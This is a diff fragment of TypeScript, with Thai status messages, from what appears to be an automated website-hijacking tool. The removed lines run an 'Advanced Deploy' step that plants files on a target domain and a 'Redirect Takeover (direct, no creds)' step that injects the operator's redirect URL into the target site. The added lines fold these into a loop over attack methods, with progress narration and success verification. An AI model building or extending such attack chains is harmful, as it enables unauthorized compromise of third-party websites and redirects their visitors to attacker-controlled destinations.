-          const { generation, deployment } = await generateAndDeployAdvanced(domain, redirectUrl, {
-            userId: 1,
-            onProgress: async (event) => {
-              try { await narrator.addStep(event.detail.substring(0, 60)); } catch {}
-            },
-          });
-          const advVerified = deployment.deployedUrls.filter((u: { url: string; type: string; verified: boolean }) => u.verified);
-          if (advVerified.length > 0 || deployment.verifiedFiles > 0) {
-            fullChainSuccess = true;
-            successMethod = `Advanced Deploy (${deployment.methodsUsed.join(", ")})`;
-            successUrl = advVerified[0]?.url || deployment.deployedUrls[0]?.url || "";
-            await narrator.addAnalysis(`✅ Advanced Deploy สำเร็จ! ${deployment.verifiedFiles}/${deployment.totalFiles} verified, methods: ${deployment.methodsUsed.join(", ")}`);
-          } else {
-            failedMethods.push(`Advanced (${deployment.deployedFiles}/${deployment.totalFiles} deployed, 0 verified)`);
-            await narrator.addAnalysis(`❌ Advanced Deploy ล้มเหลว — ลองวิธีถัดไป...`);
-          }
-        } catch (advErr: any) {
-          failedMethods.push(`Advanced (${advErr.message?.substring(0, 30) || "error"})`);
-          await narrator.addAnalysis(`❌ Advanced error — ลองวิธีถัดไป...`);
-        }
-        timings.push({ step: "Method 4: Advanced", ms: Date.now() - s5, ok: fullChainSuccess });
-      }
-      
-      // Method 5: Redirect Takeover (direct, no creds)
-      if (!fullChainSuccess) {
-        await narrator.startPhase("hijack", "🎯 วิธีที่ 5: Redirect Takeover ตรง");
-        const s6 = Date.now();
-        try {
-          const { executeRedirectTakeover } = await import("./redirect-takeover");
-          const rtResults = await executeRedirectTakeover({ targetUrl: `https://${domain}`, ourRedirectUrl: redirectUrl });
-          const rtSucceeded = rtResults.filter(r => r.success);
-          for (const r of rtResults) {
-            await narrator.addStep(`${r.success ? "✅" : "❌"} ${r.method}`);
-            await narrator.completeLastStep(r.success ? "done" : "failed");
-          }
-          if (rtSucceeded.length > 0) {
-            fullChainSuccess = true;
-            successMethod = `Redirect Takeover (${rtSucceeded.map(r => r.method).join(", ")})`;
-            successUrl = rtSucceeded[0]?.injectedUrl || "";
-            await narrator.addAnalysis(`✅ Redirect Takeover สำเร็จ!`);
-          } else {
-            failedMethods.push(`Redirect (0/${rtResults.length})`);
-            await narrator.addAnalysis(`❌ Redirect Takeover ล้มเหลวทั้งหมด`);
-          }
-        } catch (rtErr: any) {
-          failedMethods.push(`Redirect (${rtErr.message?.substring(0, 30) || "error"})`);
-        }
-        timings.push({ step: "Method 5: Redirect", ms: Date.now() - s6, ok: fullChainSuccess });
-      }
+        timings.push({ step: `Method ${mi + 1}: ${methodDef.name}`, ms: Date.now() - methodStart, ok: fullChainSuccess });
+      } // end for loop
       
       // ===== VERIFICATION =====
       await narrator.startPhase("verify", "✅ ตรวจสอบผลลัพธ์");
